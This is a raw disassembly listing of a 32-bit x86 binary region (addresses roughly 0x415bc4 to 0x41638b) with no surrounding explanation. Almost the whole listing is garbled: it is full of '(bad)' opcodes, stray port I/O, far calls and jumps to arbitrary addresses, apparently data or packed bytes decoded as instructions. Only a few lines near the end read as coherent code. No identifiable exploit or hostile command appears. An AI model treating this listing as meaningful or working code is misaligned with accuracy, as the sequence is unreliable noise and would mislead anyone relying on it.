  415bc4:	pop    es
  415bc5:	cmp    BYTE PTR [edx-0x76],al
  415bc8:	les    edi,FWORD PTR [bx+si]
  415bcb:	sti    
  415bcc:	js     0x415c13
  415bce:	imul   eax,DWORD PTR [esi],0xffffffbb
  415bd1:	jo     0x415b89
  415bd3:	dec    edi
  415bd4:	jbe    0x415c2e
  415bd6:	daa    
  415bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bd8:	mov    BYTE PTR [ebx],al
  415bda:	cdq    
  415bdb:	aas    
  415bdc:	jmp    esp
  415bde:	in     al,0xde
  415be0:	mov    eax,ds:0xf6d2fd3
  415be5:	pop    ebx
  415be6:	push   edi
  415be7:	into   
  415be8:	ret    
  415be9:	test   al,0xd3
  415beb:	push   ebp
  415bec:	mov    edx,0xc1629ea1
  415bf1:	mov    ebx,0xebdbc3a0
  415bf6:	jne    0x415c45
  415bf8:	xchg   edi,eax
  415bf9:	mov    ebx,0xac7040eb
  415bfe:	jg     0x415c43
  415c00:	xchg   esi,eax
  415c01:	aad    0x13
  415c03:	sbb    al,0xac
  415c05:	jae    0x415c68
  415c07:	cdq    
  415c08:	(bad)  
  415c09:	(bad)  
  415c0b:	xor    eax,0x409621a8
  415c10:	and    eax,0x69e142b1
  415c15:	test   eax,0xf25c12b7
  415c1a:	push   ebp
  415c1b:	xor    BYTE PTR [eax],bl
  415c1d:	jge    0x415c32
  415c1f:	inc    edx
  415c20:	pushf  
  415c21:	ds jecxz 0x415baa
  415c24:	mov    dl,dl
  415c26:	cdq    
  415c27:	aam    0xff
  415c29:	xor    BYTE PTR [ebp+ebp*1-0xf1b8ec9],bl
  415c30:	shr    BYTE PTR [ebp-0x48f911ac],cl
  415c36:	jg     0x415c6a
  415c38:	shl    WORD PTR [ebx+0x2e935840],0x3
  415c40:	or     eax,0x6964388e
  415c46:	mov    edx,0x5616442a
  415c4b:	inc    esi
  415c4c:	push   esi
  415c4d:	pop    eax
  415c4e:	mov    ds,WORD PTR [eax]
  415c50:	cmp    eax,0x5a1cd22e
  415c55:	adc    al,0x17
  415c57:	sbb    al,0x8d
  415c59:	hlt    
  415c5a:	xchg   esp,eax
  415c5b:	push   0xc78f8f6a
  415c60:	out    0x40,eax
  415c62:	jnp    0x57d3ab67
  415c68:	mov    BYTE PTR [edx],al
  415c6a:	sbb    cl,BYTE PTR ds:0x34bfb378
  415c70:	outs   dx,BYTE PTR ds:[esi]
  415c71:	(bad)  
  415c72:	aam    0x82
  415c74:	pop    ebx
  415c75:	inc    eax
  415c76:	pop    ss
  415c77:	mov    ebx,DWORD PTR [edi-0x16]
  415c7a:	or     al,0x74
  415c7c:	xor    al,0x79
  415c7e:	into   
  415c7f:	mov    DWORD PTR [ebx+edx*2],ebx
  415c82:	clc    
  415c83:	mov    al,ds:0xd7c6d1dd
  415c88:	jns    0x415c94
  415c8a:	cmp    DWORD PTR ds:0x4f8f81fd,0xf2532bef
  415c94:	inc    eax
  415c95:	ret    0xeb6f
  415c98:	adc    eax,0x54c3f39
  415c9d:	jle    0x415c9a
  415c9f:	outs   dx,DWORD PTR ds:[esi]
  415ca0:	ds js  0x415c5b
  415ca3:	cmp    al,BYTE PTR [eax+0x28]
  415ca6:	adc    al,0xbc
  415ca8:	inc    eax
  415ca9:	add    esp,eax
  415cab:	sub    DWORD PTR [edi+0x279aa845],eax
  415cb1:	sub    BYTE PTR [ecx],dl
  415cb3:	in     al,dx
  415cb4:	sub    al,0xa8
  415cb6:	bound  ebp,QWORD PTR [esi+0x39]
  415cb9:	out    dx,eax
  415cba:	stos   BYTE PTR es:[edi],al
  415cbb:	sub    al,0x45
  415cbd:	clc    
  415cbe:	(bad)  
  415cbf:	std    
  415cc0:	mov    ch,0x50
  415cc2:	sbb    DWORD PTR [ecx],esp
  415cc4:	pop    ss
  415cc5:	std    
  415cc6:	clc    
  415cc7:	lds    ebx,FWORD PTR [ebx]
  415cc9:	es jmp 0x415d17
  415ccc:	ins    BYTE PTR es:[edi],dx
  415ccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cce:	adc    DWORD PTR [ebx+0x6ed1b6ec],ebx
  415cd4:	jmp    0x415ca0
  415cd6:	push   ebp
  415cd7:	popa   
  415cd8:	add    al,0x62
  415cda:	jbe    0x415c86
  415cdc:	ins    BYTE PTR es:[edi],dx
  415cdd:	shl    esp,0x14
  415ce0:	jg     0x415c68
  415ce2:	xlat   BYTE PTR ds:[ebx]
  415ce3:	jmp    0x4f6f9b9d
  415ce8:	xchg   BYTE PTR [eax],bh
  415cea:	lods   eax,DWORD PTR ds:[esi]
  415ceb:	or     DWORD PTR [ecx-0x8],ebx
  415cee:	adc    edi,DWORD PTR [ecx]
  415cf0:	pusha  
  415cf1:	jmp    0x6225:0xfb3cfc52
  415cf8:	mov    ecx,0xe8513584
  415cfd:	ins    DWORD PTR es:[edi],dx
  415cfe:	(bad)  
  415d00:	stc    
  415d01:	je     0x415d57
  415d03:	loope  0x415d4c
  415d05:	cmp    BYTE PTR [ebx+ebx*4-0x38],0xf7
  415d0a:	sub    DWORD PTR [edi+0xa25c2ba],0x19
  415d11:	xor    eax,0x2ed27808
  415d16:	ds (bad) 
  415d18:	mov    ecx,0xe5b56567
  415d1d:	jmp    0x415cbd
  415d1f:	call   FWORD PTR [esi+0x6fd3554d]
  415d25:	push   ebx
  415d26:	ja     0x415d78
  415d28:	mov    ds:0x8892b811,al
  415d2d:	add    eax,0x6744594e
  415d32:	enter  0x9dae,0x71
  415d36:	and    eax,0xf8835668
  415d3b:	add    DWORD PTR [ebx-0x23b2995e],ecx
  415d41:	inc    ebp
  415d42:	out    0x50,eax
  415d44:	stc    
  415d45:	leave  
  415d46:	pop    esp
  415d47:	jmp    0x5160e88d
  415d4c:	and    eax,0xb4318ff3
  415d51:	pop    ds
  415d52:	push   esi
  415d53:	cmp    BYTE PTR [ecx+0x2],bl
  415d56:	pusha  
  415d57:	pop    edx
  415d58:	int    0x21
  415d5a:	sbb    al,0xca
  415d5c:	add    BYTE PTR [eax],cl
  415d5e:	cmp    eax,DWORD PTR [edx+ecx*2+0x729c588e]
  415d65:	icebp  
  415d66:	push   ebx
  415d67:	es aas 
  415d69:	(bad)  [esp+ebx*8]
  415d6c:	data16 in al,dx
  415d6e:	mov    dl,0x67
  415d70:	jecxz  0x415d80
  415d72:	stos   BYTE PTR es:[edi],al
  415d73:	inc    eax
  415d74:	and    DWORD PTR [edx-0x6a],eax
  415d77:	jo     0x415d82
  415d79:	fdecstp 
  415d7b:	loope  0x415d18
  415d7d:	jge    0x415d52
  415d7f:	and    BYTE PTR [ebx],0x80
  415d82:	cs daa 
  415d84:	adc    eax,0x5fa483d8
  415d89:	outs   dx,BYTE PTR ds:[esi]
  415d8a:	test   DWORD PTR ds:0x55afeaea,esi
  415d90:	lahf   
  415d91:	ss xchg esp,eax
  415d93:	bound  esi,QWORD PTR [edx+0x568ddade]
  415d99:	pop    ebp
  415d9a:	lahf   
  415d9b:	xor    DWORD PTR [ecx],edx
  415d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d9e:	sub    al,BYTE PTR [edi+0x671f5680]
  415da4:	inc    esi
  415da5:	mov    esi,0x6c2ea3f0
  415daa:	xor    edi,eax
  415dac:	mov    DWORD PTR [ebp+0x10],ecx
  415daf:	jmp    0x416339
  415db4:	inc    eax
  415db5:	mov    cl,BYTE PTR [ebx+edi*1+0x3c]
  415db9:	inc    ecx
  415dba:	inc    eax
  415dbb:	nop
  415dbc:	scas   eax,DWORD PTR es:[edi]
  415dbd:	shl    eax,0x74
  415dc0:	in     al,0x64
  415dc2:	jl     0x415d72
  415dc4:	es mov bl,0xc
  415dc7:	push   ss
  415dc8:	cmp    eax,0x80161604
  415dcd:	xchg   BYTE PTR [edi+esi*1-0x2c90f283],cl
  415dd4:	inc    edx
  415dd5:	adc    dl,bh
  415dd7:	xor    eax,0x85c86f06
  415ddc:	pop    ds
  415ddd:	enter  0xc466,0xfe
  415de1:	pop    eax
  415de2:	fcom   QWORD PTR [esi-0x68]
  415de5:	pop    eax
  415de6:	and    eax,DWORD PTR [esi+0x6a53f6a]
  415dec:	add    ecx,DWORD PTR [ebp+edx*1+0x4b60b745]
  415df3:	inc    edx
  415df4:	jne    0x415e0b
  415df6:	xchg   ebp,eax
  415df7:	jnp    0x415d91
  415df9:	pusha  
  415dfa:	cdq    
  415dfb:	mov    eax,ds:0x3c4cad21
  415e00:	adc    cl,BYTE PTR [eax]
  415e02:	adc    BYTE PTR [esi+0x21],dh
  415e05:	mov    eax,ds:0x3e62560a
  415e0a:	sbb    DWORD PTR [ecx+edi*8-0x3e87ac07],0xc1e51d4
  415e15:	jbe    0x415e09
  415e17:	cmp    dl,ch
  415e19:	rcl    DWORD PTR [eax+0x2ab5e5a9],0x75
  415e20:	lock aam 0x52
  415e23:	cmovne edx,DWORD PTR [eax+0xc]
  415e27:	ret    0xd066
  415e2a:	mov    ds:0xcffb04d6,al
  415e2f:	ja     0x415e1b
  415e31:	ss dec esp
  415e33:	dec    esp
  415e34:	cmp    al,0xe6
  415e36:	inc    edi
  415e37:	test   DWORD PTR [esi],0x5b273151
  415e3d:	mov    bl,BYTE PTR [esi+edx*1+0x28]
  415e41:	jmp    0x415e11
  415e43:	xlat   BYTE PTR ds:[ebx]
  415e44:	push   ebp
  415e45:	mov    bh,0x85
  415e47:	out    dx,al
  415e48:	into   
  415e49:	int3   
  415e4a:	adc    esi,edi
  415e4c:	pop    edx
  415e4d:	daa    
  415e4e:	ins    BYTE PTR es:[edi],dx
  415e4f:	push   esp
  415e50:	pop    eax
  415e51:	xlat   BYTE PTR ds:[ebx]
  415e52:	mov    bh,0x38
  415e54:	dec    edi
  415e55:	jl     0x415e68
  415e57:	ret    0x20ac
  415e5a:	adc    dh,BYTE PTR [ecx+0x6f]
  415e5d:	lods   al,BYTE PTR ds:[esi]
  415e5e:	inc    ebp
  415e5f:	stc    
  415e60:	add    BYTE PTR [ebx+0x3a],0xdc
  415e64:	mov    edx,0xd0ec2c2
  415e69:	je     0x415ead
  415e6b:	mov    ch,BYTE PTR es:[edi-0x66]
  415e6f:	or     eax,0x84161d0f
  415e74:	pop    esp
  415e75:	add    edx,ebp
  415e77:	scas   al,BYTE PTR es:[edi]
  415e78:	daa    
  415e79:	adc    eax,0xac9b5f18
  415e7e:	mov    ebp,0xab6ce328
  415e83:	(bad)  
  415e85:	in     al,dx
  415e86:	ja     0x415eb1
  415e88:	dec    ecx
  415e89:	sub    BYTE PTR [ecx-0x15200f6],ah
  415e8f:	add    ebp,0x5a
  415e92:	xchg   BYTE PTR ds:0x51e55555,cl
  415e98:	sub    eax,esi
  415e9a:	sbb    al,0x93
  415e9c:	bound  edi,QWORD PTR [eax]
  415e9e:	mov    edx,0x2a66c260
  415ea3:	push   ds
  415ea4:	push   ss
  415ea5:	cmp    eax,0x641a8473
  415eaa:	inc    esp
  415eab:	mov    dh,0xd1
  415ead:	xchg   edx,eax
  415eae:	xchg   ecx,eax
  415eaf:	adc    BYTE PTR [edx+0x48],al
  415eb2:	in     eax,0xde
  415eb4:	cmp    eax,0xdffceca1
  415eb9:	cmp    BYTE PTR [esi+0x20],al
  415ebc:	mov    ebp,0x8a382b77
  415ec1:	dec    esp
  415ec2:	mov    edx,DWORD PTR [ebp-0x1f]
  415ec5:	pop    ebx
  415ec6:	test   DWORD PTR [edi+0x15],ecx
  415ec9:	cld    
  415eca:	push   ss
  415ecb:	pop    es
  415ecc:	hlt    
  415ecd:	(bad)  
  415ece:	or     BYTE PTR [esi],dl
  415ed0:	outs   dx,DWORD PTR ds:[esi]
  415ed1:	xchg   DWORD PTR [ebp-0x7f],esp
  415ed4:	cmp    DWORD PTR [ebx-0x2f30c31c],eax
  415eda:	in     eax,dx
  415edb:	test   ebp,esi
  415edd:	xchg   ecx,eax
  415ede:	clc    
  415edf:	das    
  415ee0:	ficom  WORD PTR [ebp+edi*1+0x44e0c3b3]
  415ee7:	dec    esi
  415ee8:	jle    0x415ef3
  415eea:	out    dx,eax
  415eeb:	ror    BYTE PTR [esi],cl
  415eed:	sub    ebp,ebp
  415eef:	jmp    0x415f48
  415ef1:	xor    al,0x76
  415ef3:	xchg   esi,eax
  415ef4:	push   esp
  415ef5:	mov    al,ds:0xa573c4da
  415efa:	sub    ecx,DWORD PTR [ebp+0x17]
  415efd:	push   es
  415efe:	repnz push ecx
  415f00:	add    eax,0xd8ecdd38
  415f05:	imul   esi,DWORD PTR [ecx-0x41d88d8],0x4f4406c1
  415f0f:	cs mov esp,0x8c466e29
  415f15:	nop
  415f16:	xor    ch,BYTE PTR [edi-0x18]
  415f19:	call   0xf50095cf
  415f1e:	int3   
  415f1f:	cwde   
  415f20:	imul   edx,DWORD PTR es:[ebp+0x3c],0x311e433d
  415f28:	jnp    0x415ec1
  415f2a:	dec    edx
  415f2b:	xchg   ebp,eax
  415f2c:	(bad)  
  415f2d:	(bad)  [ebx+0x6b]
  415f30:	lds    esp,FWORD PTR [esi+0x50f174fc]
  415f36:	(bad)  
  415f37:	shl    BYTE PTR [edx-0xa],1
  415f3a:	in     al,dx
  415f3b:	cdq    
  415f3c:	add    cl,BYTE PTR [ecx+0x15444f60]
  415f42:	xor    edi,DWORD PTR [edx]
  415f44:	pop    ebx
  415f45:	cmc    
  415f46:	rol    DWORD PTR [eax],1
  415f48:	xchg   cl,ch
  415f4a:	popf   
  415f4b:	or     ecx,DWORD PTR [eax+esi*8]
  415f4e:	xor    al,0x4c
  415f50:	fstp   DWORD PTR [esp+esi*8-0x23]
  415f54:	mov    esp,0x552b01bc
  415f59:	loopne 0x415f5a
  415f5b:	xchg   edi,eax
  415f5c:	mov    BYTE PTR [edi+0x614bd4a4],ch
  415f62:	jecxz  0x415f48
  415f64:	cs jnp 0x415fb1
  415f67:	mov    edi,0x8c1c516
  415f6c:	mov    eax,ds:0x239d1bf1
  415f71:	sar    DWORD PTR [ecx],cl
  415f73:	inc    edi
  415f74:	adc    edi,DWORD PTR [ebx+0x1d87050]
  415f7a:	lds    esp,FWORD PTR ds:0x9c873ab6
  415f80:	lahf   
  415f81:	xor    dl,0x53
  415f84:	stos   DWORD PTR es:[edi],eax
  415f85:	and    DWORD PTR [edx],esp
  415f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f88:	cmp    ebp,edi
  415f8a:	mov    fs,WORD PTR [edi+0x4cabb0eb]
  415f90:	out    dx,eax
  415f91:	dec    esp
  415f92:	fwait
  415f93:	cld    
  415f94:	jo     0x415f6e
  415f96:	mov    ecx,0xc0747b80
  415f9b:	ret    0x7755
  415f9e:	jp     0x415fd8
  415fa0:	scas   eax,DWORD PTR es:[edi]
  415fa1:	inc    esi
  415fa2:	stos   DWORD PTR es:[edi],eax
  415fa3:	fs (bad) 
  415fa5:	call   0x2bcb:0x9afbd3ba
  415fac:	sbb    BYTE PTR ds:0x81e993c1,dl
  415fb2:	int3   
  415fb3:	push   DWORD PTR [ebx+esi*8]
  415fb6:	and    bh,BYTE PTR [ebx-0xab47cae]
  415fbc:	scas   al,BYTE PTR es:[edi]
  415fbd:	adc    ah,BYTE PTR [eax]
  415fbf:	pop    ds
  415fc0:	popa   
  415fc1:	xlat   BYTE PTR ds:[ebx]
  415fc2:	lds    ebx,FWORD PTR [ebp-0x21]
  415fc5:	lods   al,BYTE PTR ds:[esi]
  415fc6:	inc    edi
  415fc7:	lea    esp,[edx-0x328a4e2d]
  415fcd:	mov    BYTE PTR [eax-0x24],bl
  415fd0:	push   cs
  415fd1:	sbb    bl,BYTE PTR [ebx+ebp*4+0x1fed8a0d]
  415fd8:	mov    eax,ds:0xaa903db8
  415fdd:	pop    ecx
  415fde:	sahf   
  415fdf:	sub    cl,0x79
  415fe2:	and    cl,bl
  415fe4:	sbb    dh,BYTE PTR ds:0x8dca023f
  415fea:	ds daa 
  415fec:	icebp  
  415fed:	push   ds
  415fee:	or     ebp,DWORD PTR [eax-0xe]
  415ff1:	push   0x3f
  415ff3:	data16 loop 0x415fa8
  415ff6:	fldcw  WORD PTR [ebp-0x2a53b943]
  415ffc:	xchg   BYTE PTR [ecx],bl
  415ffe:	dec    edi
  415fff:	aad    0x74
  416001:	push   edx
  416002:	stos   DWORD PTR es:[edi],eax
  416003:	mov    ch,0xe6
  416005:	test   eax,0xcaec53bb
  41600a:	sub    esp,DWORD PTR [ebx-0x58]
  41600d:	dec    ebp
  41600e:	push   eax
  41600f:	mov    DWORD PTR [ebp+edi*8+0x6f],ecx
  416013:	cmp    eax,0x36887275
  416018:	add    DWORD PTR [edx-0xeb5eaf7],0xa6391df8
  416022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416023:	mov    ebp,gs
  416025:	cs adc al,0xf0
  416028:	adc    eax,0x31481646
  41602d:	push   0x14
  41602f:	pop    edi
  416030:	inc    ebx
  416031:	test   al,0x1f
  416033:	cmc    
  416034:	ins    BYTE PTR es:[edi],dx
  416035:	stc    
  416036:	sub    esi,edi
  416038:	and    ebx,DWORD PTR [ebx+ecx*2]
  41603b:	jmp    0x415ff2
  41603d:	outs   dx,BYTE PTR ds:[esi]
  41603e:	add    eax,0x7869ece4
  416043:	jnp    0x416001
  416045:	pop    edi
  416046:	mov    dh,0x5a
  416048:	inc    eax
  416049:	inc    edi
  41604a:	cmc    
  41604b:	(bad)  
  41604c:	push   esi
  41604d:	dec    esp
  41604e:	cwde   
  41604f:	cwde   
  416050:	icebp  
  416051:	inc    ecx
  416052:	adc    ecx,DWORD PTR [edx-0x2dc16d]
  416058:	and    BYTE PTR [esi],bh
  41605a:	(bad)  
  41605b:	fdivr  QWORD PTR [edi-0x25693cfd]
  416061:	and    DWORD PTR [ebx],esi
  416063:	inc    eax
  416064:	(bad)  
  416067:	cdq    
  416068:	sbb    BYTE PTR ds:0xee9eeec,dl
  41606e:	in     eax,0x62
  416070:	sbb    esi,DWORD PTR [eax+0x45]
  416073:	or     eax,DWORD PTR [ecx-0x62413756]
  416079:	xor    al,0xf0
  41607b:	dec    esi
  41607c:	stos   DWORD PTR es:[edi],eax
  41607d:	pop    edx
  41607e:	xchg   esp,eax
  41607f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416080:	mov    BYTE PTR [edx+0x7978d007],0x72
  416087:	push   eax
  416088:	jns    0x416037
  41608a:	xor    DWORD PTR [ebp+0x4f],ecx
  41608d:	je     0x4160b1
  41608f:	mov    esp,edi
  416091:	mov    bh,0x63
  416093:	into   
  416094:	test   edi,eax
  416096:	mov    ecx,0x188491e4
  41609b:	mov    cl,0xc6
  41609d:	adc    DWORD PTR ds:0x233bfc26,ecx
  4160a3:	mov    dh,0x31
  4160a5:	stc    
  4160a6:	jae    0x416060
  4160a8:	pop    esp
  4160a9:	cmp    ecx,DWORD PTR [eax+0x48a300e2]
  4160af:	fdiv   QWORD PTR [ecx-0xa21c2d8]
  4160b5:	popf   
  4160b6:	jl     0x416042
  4160b8:	jne    0x41603a
  4160ba:	xchg   ebx,eax
  4160bb:	(bad)  
  4160bc:	daa    
  4160bd:	and    al,0x15
  4160bf:	sbb    BYTE PTR [edi-0x3],0xca
  4160c3:	cli    
  4160c4:	int3   
  4160c5:	call   0xa94b:0xd8dbd632
  4160cc:	ret    0xfda4
  4160cf:	xchg   ecx,eax
  4160d0:	push   ss
  4160d1:	lods   al,BYTE PTR ds:[esi]
  4160d2:	cld    
  4160d3:	dec    esi
  4160d4:	int    0x5c
  4160d6:	mov    al,0x46
  4160d8:	inc    edx
  4160d9:	dec    ebx
  4160da:	sbb    eax,DWORD PTR [edx-0x1d]
  4160dd:	test   eax,0xa0f5bfb6
  4160e2:	inc    ecx
  4160e3:	call   0x9b7b592d
  4160e8:	fmul   DWORD PTR [edx]
  4160ea:	and    ebx,DWORD PTR [ebx+0x41721c2b]
  4160f0:	jp     0x416151
  4160f2:	mov    dh,0x23
  4160f4:	fisubr DWORD PTR [eax+edx*4]
  4160f7:	(bad)  ds:0x37305eb4
  4160fd:	das    
  4160fe:	iret   
  4160ff:	(bad)  
  416100:	stos   BYTE PTR es:[edi],al
  416101:	ja     0x4160fb
  416103:	and    BYTE PTR [ecx+0x1e],ch
  416106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416107:	sbb    esp,DWORD PTR [ebp+0x52]
  41610a:	aad    0x4b
  41610c:	mov    esi,0xa7bad9b1
  416111:	scas   al,BYTE PTR es:[edi]
  416112:	in     ax,dx
  416114:	dec    dh
  416116:	and    al,0x6c
  416118:	(bad)  
  416119:	div    DWORD PTR [edx-0x78]
  41611c:	es int3 
  41611e:	rol    DWORD PTR [edi-0x7c186c49],1
  416124:	cmp    eax,0x8c35bbd8
  416129:	stc    
  41612a:	imul   edx,DWORD PTR [edi+0x1c],0xffffffc1
  41612e:	sbb    DWORD PTR [edx],edx
  416130:	sub    BYTE PTR [ebp+0x60],bh
  416133:	cs mov edx,0x52c08775
  416139:	dec    esp
  41613a:	into   
  41613b:	dec    ecx
  41613c:	pop    edx
  41613d:	sbb    dl,BYTE PTR [edx+eax*8]
  416140:	xchg   esp,eax
  416141:	loope  0x4160ea
  416143:	ja     0x416130
  416145:	add    al,0xbb
  416147:	repnz sbb BYTE PTR [ebx],ch
  41614a:	sbb    BYTE PTR [eax],cl
  41614c:	repz inc edx
  41614e:	fwait
  41614f:	push   0x1cae8c23
  416154:	mov    ebp,0x9ffd8314
  416159:	dec    ecx
  41615a:	dec    ebx
  41615b:	mov    ch,0x3d
  41615d:	push   ebx
  41615e:	stc    
  41615f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416160:	test   al,0x35
  416162:	fbstp  TBYTE PTR [ebx+ebp*8+0x51]
  416166:	out    0x94,al
  416168:	inc    eax
  416169:	fadd   st,st(1)
  41616b:	jle    0x4161af
  41616d:	adc    edx,edi
  41616f:	in     al,0x7a
  416171:	push   ebp
  416172:	mov    ah,0xb3
  416174:	adc    eax,0x40bbc491
  416179:	sub    ebp,DWORD PTR [edx+0x5fae7f13]
  41617f:	xchg   ecx,ecx
  416181:	push   es
  416182:	jle    0x416134
  416184:	xchg   esp,eax
  416185:	in     al,dx
  416186:	dec    esi
  416187:	xor    dh,BYTE PTR [ebx+0x45]
  41618a:	inc    edi
  41618b:	push   ss
  41618c:	xchg   esi,eax
  41618d:	jle    0x4161b3
  41618f:	jp     0x4161a1
  416191:	push   edi
  416192:	inc    ebp
  416193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416194:	adc    eax,DWORD PTR [edx+esi*4-0x7d728282]
  41619b:	mov    BYTE PTR [eax-0x60176a12],0x8
  4161a2:	lock fld st(2)
  4161a5:	ret    
  4161a6:	je     0x41612b
  4161a8:	push   esp
  4161a9:	xor    bh,BYTE PTR [ebp+0x64931f92]
  4161af:	repz sbb BYTE PTR [ecx+0x79],bl
  4161b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161b4:	jae    0x416188
  4161b6:	or     dh,BYTE PTR ds:0xc4c1b38e
  4161bc:	or     dh,BYTE PTR [esi]
  4161be:	ja     0x416186
  4161c0:	ret    0x6e15
  4161c3:	xchg   edx,eax
  4161c4:	repnz inc ebx
  4161c6:	xchg   edi,eax
  4161c7:	add    eax,0x324d5cd1
  4161cc:	dec    ebp
  4161cd:	idiv   DWORD PTR [edx]
  4161cf:	cmp    DWORD PTR [esi-0x24],ecx
  4161d2:	loopne 0x416239
  4161d4:	sub    al,0xca
  4161d6:	(bad)  
  4161d7:	xor    eax,DWORD PTR [edx-0x11]
  4161da:	xor    ch,0x4e
  4161dd:	ins    BYTE PTR es:[edi],dx
  4161de:	test   al,0x7b
  4161e0:	mov    esi,0x20a8b23d
  4161e5:	sub    ecx,DWORD PTR [edi+ebp*4]
  4161e8:	add    eax,0x72b568ce
  4161ed:	adc    eax,0x4cc2b01
  4161f2:	or     eax,0x59b6e7ce
  4161f7:	das    
  4161f8:	jmp    0x416229
  4161fa:	push   edi
  4161fb:	cmc    
  4161fc:	add    BYTE PTR [edi-0x767ca8ec],ah
  416202:	add    edx,DWORD PTR [ebp+0x14999a34]
  416208:	lods   eax,DWORD PTR ds:[esi]
  416209:	push   ebx
  41620a:	fldenv [edx+0x64]
  41620d:	(bad)  
  41620e:	push   0x4f4f1fe6
  416213:	cmp    eax,0xcb3f1ba0
  416218:	jg     0x41628b
  41621a:	out    dx,al
  41621b:	(bad)  [edi-0x58]
  41621e:	mov    al,0xa4
  416220:	jecxz  0x4161dd
  416222:	pop    es
  416223:	sbb    BYTE PTR [esi],ah
  416225:	cmp    DWORD PTR [edi],esi
  416227:	cld    
  416228:	popa   
  416229:	sbb    bl,BYTE PTR [ebx+0x5e928ec6]
  41622f:	add    al,BYTE PTR [edi]
  416231:	leave  
  416232:	push   cs
  416233:	and    ebx,DWORD PTR [ecx-0x5dd0e3f3]
  416239:	fldcw  WORD PTR [edx+0x21]
  41623c:	arpl   WORD PTR [eax+esi*2],dx
  41623f:	sub    DWORD PTR [ecx+0x459b219d],ebp
  416245:	xchg   esi,eax
  416246:	and    al,0x18
  416248:	xchg   ebp,eax
  416249:	and    BYTE PTR [eax],ch
  41624b:	lods   al,BYTE PTR ds:[esi]
  41624c:	sub    edi,eax
  41624e:	shl    BYTE PTR [eax+0x67],cl
  416251:	dec    esp
  416252:	lods   al,BYTE PTR ds:[esi]
  416253:	mov    edx,0xf429551f
  416258:	loopne 0x416245
  41625a:	shl    BYTE PTR [ebx+edi*4-0xd60d2c7],0x4d
  416262:	cmp    al,0xd8
  416264:	sar    ah,1
  416266:	inc    esp
  416267:	push   cs
  416268:	sbb    bl,BYTE PTR ds:0xd15930d
  41626e:	pop    ebp
  41626f:	xor    ecx,DWORD PTR [esi+0x2e]
  416272:	into   
  416273:	push   esp
  416274:	lods   eax,DWORD PTR ds:[esi]
  416275:	iret   
  416276:	fidivr DWORD PTR [ebp-0x39]
  416279:	jle    0x4162d3
  41627b:	(bad)  
  41627c:	sti    
  41627d:	imul   ebx,DWORD PTR [ebx+0x54e3e040],0x24
  416284:	sti    
  416285:	out    0x58,eax
  416287:	xor    BYTE PTR [esi],dh
  416289:	jp     0x4162d3
  41628b:	push   ebx
  41628c:	add    BYTE PTR [ecx+0x25025320],ah
  416292:	inc    edi
  416293:	gs aad 0xdb
  416296:	leave  
  416297:	xchg   ebp,eax
  416298:	ds pop edx
  41629a:	pusha  
  41629b:	push   esi
  41629c:	das    
  41629d:	xchg   esi,eax
  41629e:	pop    ebp
  41629f:	cs out dx,eax
  4162a1:	mov    eax,0x44a24053
  4162a6:	test   al,0x42
  4162a8:	mov    eax,0x134d0e94
  4162ad:	sub    BYTE PTR [ebp+0x19671dcc],bh
  4162b3:	int3   
  4162b4:	mov    ds:0x9087c9bf,al
  4162b9:	dec    esp
  4162ba:	fwait
  4162bb:	mov    bl,0x23
  4162bd:	pop    ds
  4162be:	lock leave 
  4162c0:	fs mov ebx,0xbfed601e
  4162c6:	aad    0x28
  4162c8:	outs   dx,DWORD PTR ds:[esi]
  4162c9:	push   ebx
  4162ca:	or     dh,BYTE PTR [ebp+0xeb8f82c]
  4162d0:	int3   
  4162d1:	pop    es
  4162d2:	in     al,dx
  4162d3:	add    esi,esi
  4162d5:	test   BYTE PTR [esi+0x6ddf3900],cl
  4162db:	adc    BYTE PTR [ebp+ebx*8-0x13],dh
  4162df:	push   ebp
  4162e0:	xlat   BYTE PTR ds:[ebx]
  4162e1:	test   al,0x6f
  4162e3:	inc    edi
  4162e4:	jg     0x41635b
  4162e6:	adc    BYTE PTR [edx*2-0x46933758],0x40
  4162ee:	jp     0x41635a
  4162f0:	inc    esp
  4162f1:	pop    ds
  4162f2:	nop
  4162f3:	adc    DWORD PTR [ecx-0x3a08905b],0x2636e0fb
  4162fd:	mov    bh,0x33
  4162ff:	popf   
  416300:	cmp    eax,0x8f45de2
  416305:	fsub   st,st(0)
  416307:	mov    dh,0xfb
  416309:	sbb    al,0x24
  41630b:	mov    dh,0x55
  41630d:	push   ecx
  41630e:	cmp    ebx,esp
  416310:	into   
  416311:	add    al,0x91
  416313:	mov    DWORD PTR [edi],ebp
  416315:	dec    esi
  416316:	inc    eax
  416317:	inc    esp
  416318:	or     al,BYTE PTR [esi+0x73d8509]
  41631e:	xor    bh,BYTE PTR [ecx]
  416320:	das    
  416321:	icebp  
  416322:	or     ebp,ebx
  416324:	mov    edi,0xe4bd020f
  416329:	es inc ebp
  41632b:	aaa    
  41632c:	mov    DWORD PTR [ebx-0x2],ebp
  41632f:	mov    al,ds:0x36bd083d
  416334:	push   edi
  416335:	and    ecx,DWORD PTR [edx+0xb8baf0b]
  41633b:	mov    DWORD PTR [ebp+0x14],edi
  41633e:	mov    edi,DWORD PTR [ebx+0x4]
  416341:	xor    ecx,0xba699573
  416347:	xor    edi,0x9c0a89d8
  41634d:	shrd   ecx,edi,0x2
  416351:	or     ecx,DWORD PTR [ebp+0x10]
  416354:	shr    edi,0x2
  416357:	mov    DWORD PTR [ebp-0x70],ecx
  41635a:	mov    ecx,edi
  41635c:	or     ecx,DWORD PTR [ebp+0x14]
  41635f:	mov    DWORD PTR [ebp+0xc],edi
  416362:	cmp    edx,DWORD PTR [ebp-0x70]
  416365:	jne    0x41a17f
  41636b:	cmp    DWORD PTR [ebp-0x64],ecx
  41636e:	jne    0x41a17f
  416374:	jmp    0x41854e
  416379:	mov    eax,DWORD PTR [esi]
  41637b:	mov    edx,DWORD PTR [esi+0x4]
  41637e:	mov    eax,DWORD PTR [esi]
  416380:	mov    edx,DWORD PTR [esi+0x4]
  416383:	jmp    0x41690d
  416388:	and    DWORD PTR [ecx-0x37],ebp
  41638b:	mov    esp,0x68181cb9
